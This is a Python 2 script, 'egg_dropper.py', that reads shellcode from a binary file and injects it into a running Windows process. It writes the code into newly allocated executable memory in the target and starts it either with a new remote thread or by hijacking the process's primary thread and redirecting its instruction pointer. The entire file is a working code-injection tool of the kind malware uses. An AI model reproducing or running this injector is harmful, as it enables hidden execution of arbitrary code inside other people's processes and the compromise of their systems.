"""
egg_dropper.py: A tiny script to harvest shellcode from a bin file, and inject it into a target process.

(c) h4lf-jiffie (dohmatob elvis dopgima)
"""

import sys
from libdebug.constants import *
from libdebug.debug import GetProcessIdFromName, GetPrimaryThreadId
from ctypes import *
import os
import re
import struct
from optparse import OptionParser

__AUTHOR__ = "h4lf-jiffie (dohmatob elvis dopgima)"

if __name__ == '__main__':
    # sanitize command-
    parser = OptionParser(version='%s by %s'%(os.path.basename(sys.argv[0]),__AUTHOR__),
                          usage="Usage: python %s [OPTIONS] <target_imagename_or_PID> </path/to/bin/file>"%sys.argv[0])
    parser.add_option('--hijack-primary-thread',
                      help="""hijack primary thread of target process and use it as shellcode carrier""",
                      dest='hijackprimarythread',
                      action='store_true',
                      )
    options, args = parser.parse_args()
    if len(args) < 2:
        parser.error("Insufficient command-line arguments")
    
    # calculate target PID
    target_PID = None
    try:
        target_PID  = int(sys.argv[1])
    except ValueError:
        target_PID = GetProcessIdFromName(args[0])
    if target_PID is None:
        print "%s is neither a process imagename nor ID"%args[0]
        sys.exit(-1)
            
    # grab a handle to the target process
    h = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, 0, target_PID)
    if not h:
        print "OpenProcess: Failed."
        sys.exit(-1)
    
    # harvest shellcode code from bin file
    shellcode = open(args[1], 'rb').read()
    if options.hijackprimarythread:
        target_primary_TID = GetPrimaryThreadId(target_PID)
        hThread = windll.kernel32.OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                             0,
                             target_primary_TID,
                             )
        assert hThread, "OpenThread: Failed."
        context = CONTEXT(0)
        context.ContextFlags = CONTEXT_CONTROL
        windll.kernel32.SuspendThread(hThread)
        assert windll.kernel32.GetThreadContext(hThread, byref(context))
        saved_Eip = context.Eip
        shellcode = '\x68' + struct.pack("<I", saved_Eip) + shellcode
        
    pretty = "PAYLOAD (%d bytes):"%len(shellcode)
    for j in xrange(len(shellcode)):
        if (j % 16) == 0:
            pretty += '\n\t\t'
        pretty += r'\x%02X'%ord(shellcode[j])
    print pretty
    
    # dig codecave in target process
    codecave_size = len(shellcode)
    codecave = windll.kernel32.VirtualAllocEx(h, 0, codecave_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    if not codecave:
        print "VirtualAllocEx: Failed."
        if options.hijackprimarythread:
            windll.kernel32.ResumeThread(hThread)
        sys.exit(-1)
    
    # copy shellcode to remote codecave
    dwBytesWriten = DWORD()
    copy_OK = windll.kernel32.WriteProcessMemory(h, codecave, shellcode, len(shellcode), byref(dwBytesWriten))
    if not copy_OK or (dwBytesWriten.value != len(shellcode)):
        print "failed to copy shellcode to target process"
        if options.hijackprimarythread:
            windll.kernel32.ResumeThread(hThread)
        sys.exit(-1)
    windll.kernel32.FlushInstructionCache(h, codecave, len(shellcode))

    # deploy carrier-thread to trigger remote shellcode
    if options.hijackprimarythread:
        context.Eip = codecave
        windll.kernel32.SetThreadContext(hThread, byref(context))
        windll.kernel32.ResumeThread(hThread)
    else:
        hThread = windll.kernel32.CreateRemoteThread(h, 0, 0, codecave, 0, 0, 0)
        assert hThread, "CreateRemoteThread: Failed."
    windll.kernel32.WaitForSingleObject(hThread, INFINITE)
    
    # liberate codecave
    windll.kernel32.VirtualFreeEx(h, codecave, codecave_size, MEM_RELEASE)
    
    print "\n[+] OK. %d-BYTE EGG DELIVERED."%len(shellcode)
    print "%s (c) %s %s"%("#"*13,__AUTHOR__,"#"*13)
    
    
    
        
        